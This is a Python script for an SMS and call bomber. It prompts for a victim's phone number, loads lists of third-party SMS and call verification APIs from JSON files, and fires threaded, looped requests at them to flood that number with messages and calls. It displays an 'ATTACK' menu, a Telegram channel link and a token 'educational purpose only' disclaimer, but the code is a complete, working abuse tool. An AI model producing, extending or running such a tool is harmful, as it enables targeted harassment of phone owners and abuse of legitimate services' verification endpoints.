import requests
import threading
import json
import time
import sys
import os
from datetime import datetime

# ANSI color palette
RESET   = "\x1b[0m"
BOLD    = "\x1b[1m"
DIM     = "\x1b[2m"

FG_GRAY    = "\x1b[38;5;245m"
FG_BLUE    = "\x1b[38;5;39m"
FG_CYAN    = "\x1b[38;5;45m"
FG_GREEN   = "\x1b[38;5;42m"
FG_YELLOW  = "\x1b[38;5;214m"
FG_RED     = "\x1b[38;5;203m"
FG_MAGENTA = "\x1b[38;5;177m"
FG_ORANGE  = "\x1b[38;5;208m"
FG_BLOOD_RED   = "\x1b[38;5;124m"
FG_NEON_YELLOW = "\x1b[38;5;226m"
FG_NEON_GREEN  = "\x1b[38;5;46m"
FG_GOLD    = "\x1b[38;5;220m"

# Status styles
STATUS_SUCCESS = f"{BOLD}{FG_GREEN}"
STATUS_FAIL = f"{BOLD}{FG_RED}"
STATUS_TIMEOUT = f"{BOLD}{FG_YELLOW}"
STATUS_INFO = f"{FG_CYAN}"
STATUS_WARN = f"{FG_ORANGE}"

def supports_color():
    if os.environ.get("NO_COLOR"):
        return False
    if not hasattr(sys.stderr, "isatty") or not sys.stderr.isatty():
        return False
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
            handle = kernel32.GetStdHandle(-11)
            mode = ctypes.c_ulong()
            if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                return False
            if kernel32.SetConsoleMode(handle, mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING):
                return True
        except Exception:
            return False
    return True

USE_COLOR = supports_color()

def c(code):
    return code if USE_COLOR else ""

def clear_screen():
    os.system('cls' if sys.platform == 'win32' else 'clear')

def print_banner():
    clear_screen()
    
    logo = [
        "               █        █               ",
        "               ██████████               ",
        "          █       ████       █          ",
        "       ███  █    ██████    █  ███       ",
        "    ████  ██     ██████     ██  ████    ",
        "   ████  ██      ██████      ██  ████   ",
        "  ████  ███      ██████      ███  ████  ",
        " ████   ██       ██████       ██   ████ ",
        "█████  ███       ██████       ███  █████",
        "████   ███       ██████       ███   ████",
        "████   ████      ██████      ████   ████",
        "████   ████       ████       ████   ████",
        "████   ████       ████       ████   ████",
        " ███    ████      ████      ████    ███ ",
        " ████   █████     ████     █████   ████ ",
        "  ███    █████    ████    █████    ███  ",
        "    ██     █████  ████  █████     ██    ",
        "      █     ████████████████     █      ",
        "              ████████████              ",
        "             ██████████████             ",
        "            █████ ████ █████            ",
        "                   ██                   "
    ]
    
    # Matrix rain effect
    print(f"{FG_BLOOD_RED}")
    for _ in range(8):
        sys.stdout.write("█" * 70 + "\n")
        sys.stdout.flush()
        time.sleep(0.03)
    
    clear_screen()
    
    # Typing effect
    for line in logo:
        for char in line:
            sys.stdout.write(f"{FG_BLOOD_RED}{char}{RESET}")
            sys.stdout.flush()
            time.sleep(0.002)
        print()
        time.sleep(0.01)
    
    # Sparkle effect
    time.sleep(0.3)
    for _ in range(2):
        sys.stdout.write(f"\r{FG_GOLD}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write(f"\r{FG_NEON_GREEN}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    
    print()
    
    link = f"{c(FG_GOLD)}═══════════════════════════ https://t.me/Com1te ═══════════════════════════{c(RESET)}"
    print(f"\n{link}\n")
    
def print_separator(char="━", length=70):
    print(f"{c(FG_GRAY)}{char * length}{c(RESET)}")

def load_apis(file_name="api_master.json"):
    try:
        with open(file_name, "r", encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        with open("api.json", "r", encoding="utf-8") as f:
            data = json.load(f)
    
    sms_apis = []
    call_apis = []
    
    for item in data:
        req = item.get("Request", {})
        api_type = item.get("Type", "sms")
        
        url = req.get("URL", "")
        domain = url.split('/')[2] if url and len(url.split('/')) > 2 else "unknown"
        
        api_info = {
            "url": url,
            "name": domain,
            "method": req.get("Method", "POST"),
            "payload": req.get("Payload", {}),
            "headers": req.get("Headers", {})
        }
        
        if api_type == "sms":
            sms_apis.append(api_info)
        else:
            call_apis.append(api_info)
    
    return sms_apis, call_apis

def send_request(api, phone, success, fail, lock, api_type, loop_num):
    try:
        payload = {}
        for k, v in api["payload"].items():
            if isinstance(v, str):
                v = v.replace("{{num}}", phone).replace("0{{num}}", "0" + phone)
            payload[k] = v
        
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        headers.update(api.get("headers", {}))
        
        start = time.time()
        
        if api["method"] == "POST":
            r = requests.post(api["url"], json=payload, headers=headers, timeout=5)
        else:
            r = requests.get(api["url"], params=payload, headers=headers, timeout=5)
        
        elapsed = int((time.time() - start) * 1000)
        
        with lock:
            if r.status_code in [200, 201, 202]:
                success[0] += 1
                print(f"{c(STATUS_SUCCESS)}[{loop_num}] ✓ {api['name']:<40} {c(FG_GRAY)}[{elapsed}ms]{c(RESET)}")
            else:
                fail[0] += 1
                print(f"{c(STATUS_FAIL)}[{loop_num}] ✗ {api['name']:<40} {c(FG_GRAY)}[{r.status_code}]{c(RESET)}")
    except requests.exceptions.Timeout:
        with lock:
            fail[0] += 1
            print(f"{c(STATUS_TIMEOUT)}[{loop_num}] ⚡ {api['name']:<40} {c(FG_GRAY)}[TIMEOUT]{c(RESET)}")
    except Exception:
        with lock:
            fail[0] += 1
            print(f"{c(STATUS_FAIL)}[{loop_num}] ! {api['name']:<40} {c(FG_GRAY)}[ERROR]{c(RESET)}")

def run_attack(apis, api_type, phone, loops, threads):
    if not apis:
        print(f"{c(STATUS_WARN)}No {api_type} APIs found{c(RESET)}")
        return 0, 0
    
    total_success = 0
    total_fail = 0
    
    for loop in range(loops):
        print(f"\n{c(FG_CYAN)}┌── {api_type} ATTACK [{loop + 1}/{loops}] ──{c(RESET)}")
        
        success = [0]
        fail = [0]
        lock = threading.Lock()
        threads_list = []
        
        for api in apis:
            for _ in range(threads):
                t = threading.Thread(target=send_request, args=(api, phone, success, fail, lock, api_type, loop + 1))
                t.start()
                threads_list.append(t)
                time.sleep(0.02)
        
        for t in threads_list:
            t.join()
        
        print(f"{c(FG_CYAN)}└── Result: {c(STATUS_SUCCESS)}✓ {success[0]} {c(FG_GRAY)}|{c(RESET)} {c(STATUS_FAIL)}✗ {fail[0]}{c(RESET)}")
        
        total_success += success[0]
        total_fail += fail[0]
    
    return total_success, total_fail

def main():
    print_banner()
    
    # Phone input
    print(f"{c(FG_CYAN)}┌── TARGET CONFIGURATION ──{c(RESET)}")
    phone = input(f"{c(FG_GRAY)}│  Phone number: {c(RESET)}").strip()
    if phone.startswith("0"):
        phone = phone[1:]
    print(f"{c(FG_CYAN)}└── Target: 0{phone}{c(RESET)}\n")
    
    # Select API file
    print(f"{c(FG_CYAN)}┌── SELECT API FILE ──{c(RESET)}")
    print(f"{c(FG_GRAY)}│  1.{c(RESET)} {c(FG_GREEN)}api.json{c(RESET)} {c(FG_GRAY)}(all APIs){c(RESET)}")
    print(f"{c(FG_GRAY)}│  2.{c(RESET)} {c(FG_GREEN)}api_fast.json{c(RESET)} {c(FG_GRAY)}(working only){c(RESET)}")
    print(f"{c(FG_GRAY)}│  3.{c(RESET)} {c(FG_GREEN)}Enter custom path{c(RESET)}")
    print(f"{c(FG_CYAN)}└──{c(RESET)}")
    
    api_choice = input(f"{c(FG_GRAY)}Your choice: {c(RESET)}").strip()
    
    if api_choice == "1":
        api_file = "api.json"
    elif api_choice == "2":
        api_file = "api_fast.json"
    else:
        api_file = input(f"{c(FG_GRAY)}Enter file path: {c(RESET)}").strip()
    
    # Attack type menu
    print(f"\n{c(FG_CYAN)}┌── ATTACK TYPE ──{c(RESET)}")
    print(f"{c(FG_GRAY)}│  1.{c(RESET)} {c(FG_GREEN)}SMS only{c(RESET)}")
    print(f"{c(FG_GRAY)}│  2.{c(RESET)} {c(FG_YELLOW)}CALL only{c(RESET)}")
    print(f"{c(FG_GRAY)}│  3.{c(RESET)} {c(FG_MAGENTA)}Both{c(RESET)}")
    print(f"{c(FG_CYAN)}└──{c(RESET)}")
    
    choice = input(f"{c(FG_GRAY)}Your choice: {c(RESET)}").strip()
    
    loops_input = input(f"{c(FG_GRAY)}Loops (default 1): {c(RESET)}").strip()
    loops = int(loops_input) if loops_input else 1
    
    threads_input = input(f"{c(FG_GRAY)}Threads per API (default 3): {c(RESET)}").strip()
    threads = int(threads_input) if threads_input else 3
    
    # Loading
    print(f"\n{c(FG_GRAY)}Loading APIs from {api_file}...{c(RESET)}")
    sms_apis, call_apis = load_apis(api_file)
    
    print(f"\n{c(FG_CYAN)}┌── ATTACK INFO ──{c(RESET)}")
    print(f"{c(FG_GRAY)}│  Target:      {c(FG_NEON_GREEN)}0{phone}{c(RESET)}")
    print(f"{c(FG_GRAY)}│  API File:    {c(FG_CYAN)}{api_file}{c(RESET)}")
    print(f"{c(FG_GRAY)}│  SMS APIs:    {c(FG_GREEN)}{len(sms_apis)}{c(RESET)}")
    print(f"{c(FG_GRAY)}│  CALL APIs:   {c(FG_YELLOW)}{len(call_apis)}{c(RESET)}")
    print(f"{c(FG_GRAY)}│  Loops:       {c(FG_CYAN)}{loops}{c(RESET)}")
    print(f"{c(FG_GRAY)}│  Threads/API: {c(FG_CYAN)}{threads}{c(RESET)}")
    print(f"{c(FG_CYAN)}└──{c(RESET)}\n")
    
    print_separator("═")
    
    total_success = 0
    total_fail = 0
    
    if choice == "1":
        s, f = run_attack(sms_apis, "SMS", phone, loops, threads)
        total_success, total_fail = s, f
    elif choice == "2":
        s, f = run_attack(call_apis, "CALL", phone, loops, threads)
        total_success, total_fail = s, f
    else:
        s1, f1 = run_attack(sms_apis, "SMS", phone, loops, threads)
        s2, f2 = run_attack(call_apis, "CALL", phone, loops, threads)
        total_success, total_fail = s1 + s2, f1 + f2
    
    # Final results
    print_separator("═")
    print(f"\n{c(FG_GOLD)}╔══════════════════════════════════════════════════════════════════╗{c(RESET)}")
    print(f"{c(FG_GOLD)}║{c(FG_NEON_GREEN)}                      FINAL RESULTS{c(FG_GOLD)}                      ║{c(RESET)}")
    print(f"{c(FG_GOLD)}╠══════════════════════════════════════════════════════════════════╣{c(RESET)}")
    print(f"{c(FG_GOLD)}║  {c(FG_GREEN)}✓ Successful:{c(RESET)} {total_success:<57}{c(FG_GOLD)}║{c(RESET)}")
    print(f"{c(FG_GOLD)}║  {c(FG_RED)}✗ Failed:{c(RESET)} {total_fail:<60}{c(FG_GOLD)}║{c(RESET)}")
    print(f"{c(FG_GOLD)}║  {c(FG_CYAN)}* Total Requests:{c(RESET)} {total_success + total_fail:<52}{c(FG_GOLD)}║{c(RESET)}")
    
    total = total_success + total_fail
    rate = (total_success / total * 100) if total > 0 else 0
    rate_color = FG_GREEN if rate >= 50 else (FG_YELLOW if rate >= 20 else FG_RED)
    
    print(f"{c(FG_GOLD)}║  {c(FG_CYAN)}📊 Success Rate:{c(RESET)} {c(rate_color)}{rate:.1f}%{' ' * (59 - len(f'{rate:.1f}%'))}{c(FG_GOLD)}║{c(RESET)}")
    print(f"{c(FG_GOLD)}╚══════════════════════════════════════════════════════════════════╝{c(RESET)}")
    
    print(f"\n{c(FG_GRAY)}[!] Educational purpose only. Use on your own numbers.{c(RESET)}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{c(FG_YELLOW)}[!] Stopped by user{c(RESET)}")
        sys.exit()